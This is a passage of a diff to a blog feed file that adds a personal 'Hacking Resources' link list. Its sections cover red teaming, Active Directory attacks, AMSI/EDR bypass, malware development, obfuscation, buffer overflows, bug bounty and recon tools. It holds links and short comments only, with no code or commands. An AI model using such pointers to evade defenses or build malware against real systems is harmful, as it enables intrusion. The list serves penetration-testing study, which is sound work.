+&lt;li>&lt;a href="https://crackstation.net/">https://crackstation.net/&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="red-team">Red Team&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://3xpl01tc0d3r.blogspot.com/2021/07/resource-based-constrained-delegation.html?m=1">https://3xpl01tc0d3r.blogspot.com/2021/07/resource-based-constrained-delegation.html?m=1&lt;/a> &lt;strong>&amp;lt;&amp;ndash; Resource Based Constrained Delegation IN LINUX&lt;/strong>&lt;/li>
+&lt;li>&lt;a href="https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/">https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki">https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks">https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.ired.team/">https://www.ired.team/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.harmj0y.net/blog/">https://www.harmj0y.net/blog/&lt;/a> **&amp;lt;&amp;mdash;&amp;mdash; Awesome Active Directory Posts **&lt;/li>
+&lt;li>&lt;a href="https://malicious.link/post/2016/kerberoast-pt1/">https://malicious.link/post/2016/kerberoast-pt1/&lt;/a> &lt;strong>&amp;lt;&amp;mdash;&amp;mdash; Serie about Kerberoasting (5 posts)&lt;/strong>&lt;/li>
+&lt;li>&lt;a href="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet">https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/">https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/&lt;/a> &lt;strong>&amp;lt;&amp;ndash; Abuse Constrained Delegation&lt;/strong>&lt;/li>
+&lt;li>&lt;a href="https://twitter.com/cube0x0/status/1468860246307258370?s=21">https://twitter.com/cube0x0/status/1468860246307258370?s=21&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="exploit-developmentreversingavedr-bypassmalware-analysis">Exploit Development/Reversing/AV|EDR Bypass/Malware Analysis&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://amsi.fail/">https://amsi.fail/&lt;/a> &lt;strong>&amp;lt;&amp;mdash;- Automatic generation of some AMSI Bypass&lt;/strong>&lt;/li>
+&lt;li>&lt;a href="https://blog.sevagas.com/IMG/pdf/BypassAVDynamics.pdf">https://blog.sevagas.com/IMG/pdf/BypassAVDynamics.pdf&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://ppn.snovvcrash.rocks/red-team/malware-development/code-injection/shellcode-runners">https://ppn.snovvcrash.rocks/red-team/malware-development/code-injection/shellcode-runners&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://samsclass.info/126/126_F21.shtml">https://samsclass.info/126/126_F21.shtml&lt;/a> &lt;strong>&amp;lt;&amp;mdash; Practical Malware Analysis Course!&lt;/strong>&lt;/li>
+&lt;li>&lt;a href="https://www.ringzerolabs.com/2019/08/fast-and-free-malware-analysis-lab-setup.html">https://www.ringzerolabs.com/2019/08/fast-and-free-malware-analysis-lab-setup.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://epi052.gitlab.io/notes-to-self/blog/2021-06-16-windows-usermode-exploit-development-review/">https://epi052.gitlab.io/notes-to-self/blog/2021-06-16-windows-usermode-exploit-development-review/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/m0n0ph1/Process-Hollowing">https://github.com/m0n0ph1/Process-Hollowing&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.virusbulletin.com/virusbulletin/2011/10/okay-so-you-are-win32-emulator">https://www.virusbulletin.com/virusbulletin/2011/10/okay-so-you-are-win32-emulator&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.usenix.org/system/files/conference/woot16/woot16-paper-blackthorne_update.pdf">https://www.usenix.org/system/files/conference/woot16/woot16-paper-blackthorne_update.pdf&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://blog.sannemaasakkers.com/2021/08/07/adversary-phishing-characteristics/">https://blog.sannemaasakkers.com/2021/08/07/adversary-phishing-characteristics/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/">https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://roberreigada.github.io/posts/playing_with_an_edr/">https://roberreigada.github.io/posts/playing_with_an_edr/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/jthuraisamy/SysWhispers">https://github.com/jthuraisamy/SysWhispers&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/cortex.txt">https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/cortex.txt&lt;/a> &lt;strong>&amp;lt;&amp;mdash;&amp;ndash; NON documented API&amp;rsquo;s, possible AV/EDR Bypass?&lt;/strong>&lt;/li>
+&lt;li>&lt;a href="https://0xpat.github.io/Malware_development_part_1/">https://0xpat.github.io/Malware_development_part_1/&lt;/a> &lt;strong>&amp;lt;&amp;mdash;- Malware Devlopment series&lt;/strong>&lt;/li>
+&lt;li>&lt;a href="https://github.com/BC-SECURITY/Beginners-Guide-to-Obfuscation">https://github.com/BC-SECURITY/Beginners-Guide-to-Obfuscation&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.shogunlab.com/blog/2017/08/11/zdzg-windows-exploit-0.html">https://www.shogunlab.com/blog/2017/08/11/zdzg-windows-exploit-0.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://n4r1b.netlify.app/posts/2020/01/dissecting-the-windows-defender-driver-wdfilter-part-1/">https://n4r1b.netlify.app/posts/2020/01/dissecting-the-windows-defender-driver-wdfilter-part-1/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing">https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection">https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection&lt;/a> &lt;strong>&amp;lt;&amp;mdash; APC Bypass&lt;/strong>&lt;/li>
+&lt;li>&lt;a href="https://pinvoke.net/">https://pinvoke.net/&lt;/a> &lt;strong>&amp;lt;&amp;mdash;&amp;mdash; Documented APIs for Bypass&lt;/strong>&lt;/li>
+&lt;li>&lt;a href="https://antiscan.me/">https://antiscan.me/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection&lt;/a> &lt;strong>&amp;ndash;&amp;gt; ReflectiveDLLInjection en Powershell!!!!&lt;/strong>&lt;/li>
+&lt;li>&lt;a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1&lt;/a> &lt;strong>&amp;ndash;&amp;gt; Invoke-ReflectivePEInjection Powershell&lt;/strong>&lt;/li>
+&lt;li>&lt;a href="https://blogs.msdn.microsoft.com/joelpob/2004/02/15/creating-delegate-types-via-reflection-emit/">https://blogs.msdn.microsoft.com/joelpob/2004/02/15/creating-delegate-types-via-reflection-emit/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://web.archive.org/web/20120520182849/http://www.exploit-monday.com/2012_05_13_archive.html">https://web.archive.org/web/20120520182849/http://www.exploit-monday.com/2012_05_13_archive.html&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="compiling-exploits">Compiling exploits&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://stackoverflow.com/questions/4032373/linking-against-an-old-version-of-libc-to-provide-greater-application-coverage">https://stackoverflow.com/questions/4032373/linking-against-an-old-version-of-libc-to-provide-greater-application-coverage&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.lordaro.co.uk/posts/2018-08-26-compiling-glibc.html">https://www.lordaro.co.uk/posts/2018-08-26-compiling-glibc.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/">https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="obfuscators">Obfuscators&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/Bashfuscator/Bashfuscator">https://github.com/Bashfuscator/Bashfuscator&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="deobfuscators">Deobfuscators&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://www.unphp.net/">https://www.unphp.net/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://lelinhtinh.github.io/de4js/">https://lelinhtinh.github.io/de4js/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="http://jsnice.org/">http://jsnice.org/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/java-deobfuscator/deobfuscator">https://github.com/java-deobfuscator/deobfuscator&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="buffer-overflows">Buffer Overflows&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://github.com/justinsteven/dostackbufferoverflowgood">https://github.com/justinsteven/dostackbufferoverflowgood&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/stephenbradshaw/vulnserver">https://github.com/stephenbradshaw/vulnserver&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.vulnhub.com/entry/brainpan-1,51/">https://www.vulnhub.com/entry/brainpan-1,51/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://exploit.education/phoenix/">https://exploit.education/phoenix/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.youtube.com/watch?v=1S0aBV-Waeo">https://www.youtube.com/watch?v=1S0aBV-Waeo&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="general-hacking-cheatsheetscool-articlespodcasts">General Hacking Cheatsheets/Cool Articles/Podcasts&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://github.com/chvancooten/OSEP-Code-Snippets">https://github.com/chvancooten/OSEP-Code-Snippets&lt;/a> &lt;strong>&amp;lt;&amp;mdash;- OSEP Code Snippets!&lt;/strong>&lt;/li>
+&lt;li>&lt;a href="https://github.com/tagnullde/OSCP/blob/master/oscp-cheatsheet.md">https://github.com/tagnullde/OSCP/blob/master/oscp-cheatsheet.md&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads">https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://redtm.com/docs/web-pentest/2021-01-12-web-penetration-testing-task-check-list/">https://redtm.com/docs/web-pentest/2021-01-12-web-penetration-testing-task-check-list/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/Optixal/OSCP-PWK-Notes-Public/">https://github.com/Optixal/OSCP-PWK-Notes-Public/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://epi052.gitlab.io/notes-to-self/blog/2021-06-16-windows-usermode-exploit-development-review/">https://epi052.gitlab.io/notes-to-self/blog/2021-06-16-windows-usermode-exploit-development-review/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/OlivierLaflamme/Cheatsheet-God/">https://github.com/OlivierLaflamme/Cheatsheet-God/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/sinfulz/JustTryHarder/">https://github.com/sinfulz/JustTryHarder/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/0x4D31/awesome-oscp">https://github.com/0x4D31/awesome-oscp&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/xapax/security">https://github.com/xapax/security&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://book.hacktricks.xyz/">https://book.hacktricks.xyz/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html">https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html">https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/Hack-with-Github/Awesome-Hacking">https://github.com/Hack-with-Github/Awesome-Hacking&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://jhalon.github.io/becoming-a-pentester/">https://jhalon.github.io/becoming-a-pentester/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.inteltechniques.com/podcast.html">https://www.inteltechniques.com/podcast.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://darknetdiaries.com/">https://darknetdiaries.com/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://lobuhisec.medium.com/kubernetes-pentest-recon-checklist-tools-and-resources-30d8e4b69463">https://lobuhisec.medium.com/kubernetes-pentest-recon-checklist-tools-and-resources-30d8e4b69463&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="cobalt-strike">Cobalt Strike&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet">https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="bug-bountyweb-security">Bug Bounty/Web Security&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://owasp.org/www-project-top-ten/">https://owasp.org/www-project-top-ten/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.hackerone.com/blog/Guide-Subdomain-Takeovers">https://www.hackerone.com/blog/Guide-Subdomain-Takeovers&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://0xpatrik.com/subdomain-takeover-ns/">https://0xpatrik.com/subdomain-takeover-ns/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/OWASP/wstg">https://github.com/OWASP/wstg&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/">https://github.com/swisskyrepo/PayloadsAllTheThings/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://tomnomnom.com/talks/bug-bounties-with-bash-virsec.pdf">https://tomnomnom.com/talks/bug-bounties-with-bash-virsec.pdf&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://docs.google.com/presentation/d/1DAQ47VjIaQZ88Ly00eGPQupq79hAF9AAZstV7OVCY_8">https://docs.google.com/presentation/d/1DAQ47VjIaQZ88Ly00eGPQupq79hAF9AAZstV7OVCY_8&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/ngalongc/bug-bounty-reference">https://github.com/ngalongc/bug-bounty-reference&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://gowsundar.gitbook.io/book-of-bugbounty-tips">https://gowsundar.gitbook.io/book-of-bugbounty-tips&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/jdonsec/AllThingsSSRF">https://github.com/jdonsec/AllThingsSSRF&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/jdonsec/AllThingsXXE">https://github.com/jdonsec/AllThingsXXE&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://xsleaks.com/">https://xsleaks.com/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.reddit.com/r/bugbounty/comments/983odf/how_to_become_a_bug_bounty_hunter/">https://www.reddit.com/r/bugbounty/comments/983odf/how_to_become_a_bug_bounty_hunter/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://blog.usejournal.com/bug-hunting-methodology-part-1-91295b2d2066">https://blog.usejournal.com/bug-hunting-methodology-part-1-91295b2d2066&lt;/a> **&amp;lt;&amp;mdash;&amp;mdash; Serie of 3 post about Bug Hunting Methodology **&lt;/li>
+&lt;li>&lt;a href="https://github.com/ngalongc/bug-bounty-reference">https://github.com/ngalongc/bug-bounty-reference&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://pentester.land/list-of-bug-bounty-writeups.html">https://pentester.land/list-of-bug-bounty-writeups.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://twitter.com/FaniMalikHack/status/1355145481479999488">https://twitter.com/FaniMalikHack/status/1355145481479999488&lt;/a> **&amp;lt;&amp;mdash;&amp;mdash; Tweet by @FaniMalikHack with an infographic about JWT **&lt;/li>
+&lt;/ul>
+&lt;h4 id="subdomain-finders">Subdomain finders&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/guelfoweb/knock">https://github.com/guelfoweb/knock&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://crt.sh/">https://crt.sh/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://shodan.io/">https://shodan.io/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://censys.io/ipv4/">https://censys.io/ipv4/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://securitytrails.com/">https://securitytrails.com/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/OWASP/Amass">https://github.com/OWASP/Amass&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.crunchbase.com/search/acquisitions">https://www.crunchbase.com/search/acquisitions&lt;/a> **&amp;lt;&amp;mdash;&amp;mdash; Discovering searching by acquisitions **&lt;/li>
+&lt;/ul>
+&lt;h4 id="subdomain-takeover">Subdomain takeover&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://github.com/EdOverflow/can-i-take-over-xyz">https://github.com/EdOverflow/can-i-take-over-xyz&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="discovering-of-target-by-using-asn-ip-blocks-and-reverse-whois">Discovering of Target by using ASN (IP Blocks) and reverse whois&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://bgp.he.net/">https://bgp.he.net/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://apps.db.ripe.net/db-web-ui/#/fulltextsearch">https://apps.db.ripe.net/db-web-ui/#/fulltextsearch&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://whois.arin.net/ui/query.do">https://whois.arin.net/ui/query.do&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://whoxy.com/">https://whoxy.com/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/vysecurity/DomLink">https://github.com/vysecurity/DomLink&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="screenshotting">Screenshotting&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://github.com/michenriksen/aquatone">https://github.com/michenriksen/aquatone&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/FortyNorthSecurity/EyeWitness">https://github.com/FortyNorthSecurity/EyeWitness&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/breenmachine/httpscreenshot">https://github.com/breenmachine/httpscreenshot&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/maaaaz/webscreenshot">https://github.com/maaaaz/webscreenshot&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="cool-presentationsvideos">Cool presentations/videos&lt;/h4>
+&lt;ul>
+&lt;li>Defeating EDRs using Dynamic Invocation - Jean Francois Maes &lt;a href="https://youtu.be/LXfhyTpQ7TM">https://youtu.be/LXfhyTpQ7TM&lt;/a>&lt;/li>
+&lt;li>A New Era Of SSRF: Exploiting Url Parsrs - Orange Tsai &lt;a href="https://www.youtube.com/watch?v=D1S-G8rJrEk">https://www.youtube.com/watch?v=D1S-G8rJrEk&lt;/a>&lt;/li>
+&lt;li>HTTP Desync Attacks: Smashing into the Cell Next Door - albinowax &lt;a href="https://www.youtube.com/watch?v=w-eJM2Pc0KI&amp;amp;t=1622s">https://www.youtube.com/watch?v=w-eJM2Pc0KI&amp;t=1622s&lt;/a>&lt;/li>
+&lt;li>A $7.500 BUG BOUNTY Bug Explained, step by step. (Blind XXE OOB over DNS) - STOK &lt;a href="https://www.youtube.com/watch?v=aSiIHKeN3ys&amp;amp;t=26s&amp;amp;pbjreload=101">https://www.youtube.com/watch?v=aSiIHKeN3ys&amp;t=26s&amp;pbjreload=101&lt;/a>&lt;/li>
+&lt;li>GitHub Recon and Sensitive Data Exposure &lt;a href="https://youtu.be/l0YsEk_59fQ">https://youtu.be/l0YsEk_59fQ&lt;/a>&lt;/li>
+&lt;li>Cracking the Lens: Targeting HTTP&amp;rsquo;s Hidden Attack-Surface &lt;a href="https://www.youtube.com/watch?v=zP4b3pw94s0">https://www.youtube.com/watch?v=zP4b3pw94s0&lt;/a>&lt;/li>
+&lt;li>How to Crush Bug Bounties in the first 12 Months &lt;a href="https://www.youtube.com/watch?v=AbebbJ3cRLI">https://www.youtube.com/watch?v=AbebbJ3cRLI&lt;/a>&lt;/li>
+&lt;li>The Bug Hunter&amp;rsquo;s Methodology v4.0 - Recon Edition by @jhaddix​ at #NahamCon2020​ &lt;a href="https://youtu.be/p4JgIu1mceI">https://youtu.be/p4JgIu1mceI&lt;/a>&lt;/li>
+&lt;li>How i became a HackerOne MVH without writing a single line of python (Motivational talk) by STOK &lt;a href="https://youtu.be/4YjCta2fcbw">https://youtu.be/4YjCta2fcbw&lt;/a>&lt;/li>
+&lt;li>My Journey to Cybersecurity CIA Keynote - Heath Adams (aka The Cyber Mentor) &lt;a href="https://www.youtube.com/watch?v=q4h8A5dQsZw">https://www.youtube.com/watch?v=q4h8A5dQsZw&lt;/a>&lt;/li>
+&lt;li>Defeating EDR&amp;rsquo;s using D/Invoke - Jean-François Maes - &lt;a href="https://youtu.be/d_Z_WV9fp9Q">https://youtu.be/d_Z_WV9fp9Q&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="cool-books">Cool Books&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470">https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.amazon.com/Real-World-Bug-Hunting-Field-Hacking/dp/1593278616/">https://www.amazon.com/Real-World-Bug-Hunting-Field-Hacking/dp/1593278616/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.amazon.com/How-Linux-Works-2nd-Superuser/dp/1593275676/">https://www.amazon.com/How-Linux-Works-2nd-Superuser/dp/1593275676/&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="infosec-twitter-accounts-to-follow-its-a-really-awesome-way-to-learn-as-well-will-keep-adding-them">Infosec twitter accounts to follow (it&amp;rsquo;s a really awesome way to learn as well!. Will keep adding them)&lt;/h4>
+&lt;ul>
+&lt;li>securibee: &lt;a href="https://twitter.com/securibee">https://twitter.com/securibee&lt;/a>&lt;/li>
+&lt;li>codingo_: &lt;a href="https://twitter.com/codingo">https://twitter.com/codingo&lt;/a>_&lt;/li>
+&lt;li>hakluke: &lt;a href="https://twitter.com/hakluke">https://twitter.com/hakluke&lt;/a>&lt;/li>
+&lt;li>JackRhysider: &lt;a href="https://twitter.com/JackRhysider">https://twitter.com/JackRhysider&lt;/a>&lt;/li>
+&lt;li>Orange Tsai: &lt;a href="https://twitter.com/orange_8361">https://twitter.com/orange_8361&lt;/a>&lt;/li>
+&lt;li>MalwareTech: &lt;a href="https://twitter.com/MalwareTechBlog">https://twitter.com/MalwareTechBlog&lt;/a>&lt;/li>
+&lt;li>TomTomNom: &lt;a href="https://twitter.com/TomNomNom">https://twitter.com/TomNomNom&lt;/a>&lt;/li>
+&lt;li>Jason Haddix: &lt;a href="https://twitter.com/Jhaddix">https://twitter.com/Jhaddix&lt;/a>&lt;/li>
+&lt;li>NahamSec: &lt;a href="https://twitter.com/NahamSec">https://twitter.com/NahamSec&lt;/a>&lt;/li>
+&lt;li>STOK: &lt;a href="https://twitter.com/stokfredrik">https://twitter.com/stokfredrik&lt;/a>&lt;/li>
+&lt;li>John Hammond: &lt;a href="https://twitter.com/_johnhammond">https://twitter.com/_johnhammond&lt;/a>&lt;/li>
+&lt;li>Jake Williams: &lt;a href="https://twitter.com/MalwareJake">https://twitter.com/MalwareJake&lt;/a>&lt;/li>
+&lt;li>Deviant Ollman: &lt;a href="https://twitter.com/deviantollam">https://twitter.com/deviantollam&lt;/a>&lt;/li>
+&lt;li>J3rryBl4nks: &lt;a href="https://twitter.com/JBl4nks">https://twitter.com/JBl4nks&lt;/a>&lt;/li>
+&lt;li>Tib3rius: &lt;a href="https://twitter.com/0xTib3rius">https://twitter.com/0xTib3rius&lt;/a>&lt;/li>
+&lt;li>TheColonial: &lt;a href="https://twitter.com/TheColonial">https://twitter.com/TheColonial&lt;/a>&lt;/li>
+&lt;li>Rob Fuller: &lt;a href="https://twitter.com/mubix">https://twitter.com/mubix&lt;/a>&lt;/li>
+&lt;li>g0tmi1k: &lt;a href="https://twitter.com/g0tmi1k">https://twitter.com/g0tmi1k&lt;/a>&lt;/li>
+&lt;li>TJ_Null: &lt;a href="https://twitter.com/TJ_Null">https://twitter.com/TJ_Null&lt;/a>&lt;/li>
+&lt;li>Rasta Mouse: &lt;a href="https://twitter.com/_RastaMouse">https://twitter.com/_RastaMouse&lt;/a>&lt;/li>
+&lt;li>ippsec: &lt;a href="https://twitter.com/ippsec">https://twitter.com/ippsec&lt;/a>&lt;/li>
+&lt;li>Chema Alonso: &lt;a href="https://twitter.com/chemaalonso">https://twitter.com/chemaalonso&lt;/a>&lt;/li>
+&lt;li>FalconSpy: &lt;a href="https://twitter.com/0xFalconSpy">https://twitter.com/0xFalconSpy&lt;/a>&lt;/li>
+&lt;li>Minh: &lt;a href="https://twitter.com/WhiteHoodHacker">https://twitter.com/WhiteHoodHacker&lt;/a>&lt;/li>
+&lt;li>0verfl0w: &lt;a href="https://twitter.com/0verfl0w">https://twitter.com/0verfl0w&lt;/a>_&lt;/li>
+&lt;li>Markus Höfer: &lt;a href="https://twitter.com/HashtagMarkus">https://twitter.com/HashtagMarkus&lt;/a>&lt;/li>
+&lt;li>Jonas L: &lt;a href="https://twitter.com/jonasLyk">https://twitter.com/jonasLyk&lt;/a>&lt;/li>
+&lt;li>Will Dormann: &lt;a href="https://twitter.com/wdormann">https://twitter.com/wdormann&lt;/a>&lt;/li>
+&lt;li>Scott Piper: &lt;a href="https://twitter.com/0xdabbad00">https://twitter.com/0xdabbad00&lt;/a>&lt;/li>
+&lt;/ul></description><content type="html"><![CDATA[<h1 id="hacking-resources">Hacking Resources</h1>
 <p>This isn&rsquo;t more than another hacking resources list. I basically throw here every resource I get interested on taking a look/playing with it, or stuff that I use as a reference while trying to break something.</p>
 <h4 id="usefull-web-browser-plugins">Usefull Web Browser plugins</h4>
 <ul>
@@ -831,8 +1120,8 @@ Usefull Web Browser plugins https://www.wappalyzer.com/download/ https://addons.
 <ul>
 <li>Defeating EDRs using Dynamic Invocation - Jean Francois Maes <a href="https://youtu.be/LXfhyTpQ7TM">https://youtu.be/LXfhyTpQ7TM</a></li>
 <li>A New Era Of SSRF: Exploiting Url Parsrs - Orange Tsai <a href="https://www.youtube.com/watch?v=D1S-G8rJrEk">https://www.youtube.com/watch?v=D1S-G8rJrEk</a></li>
-<li>HTTP Desync Attacks: Smashing into the Cell Next Door - albinowax <a href="https://www.youtube.com/watch?v=w-eJM2Pc0KI&amp;t=1622s">https://www.youtube.com/watch?v=w-eJM2Pc0KI&amp;t=1622s</a></li>
-<li>A $7.500 BUG BOUNTY Bug Explained, step by step. (Blind XXE OOB over DNS) - STOK <a href="https://www.youtube.com/watch?v=aSiIHKeN3ys&amp;t=26s&amp;pbjreload=101">https://www.youtube.com/watch?v=aSiIHKeN3ys&amp;t=26s&amp;pbjreload=101</a></li>
+<li>HTTP Desync Attacks: Smashing into the Cell Next Door - albinowax <a href="https://www.youtube.com/watch?v=w-eJM2Pc0KI&amp;t=1622s">https://www.youtube.com/watch?v=w-eJM2Pc0KI&t=1622s</a></li>
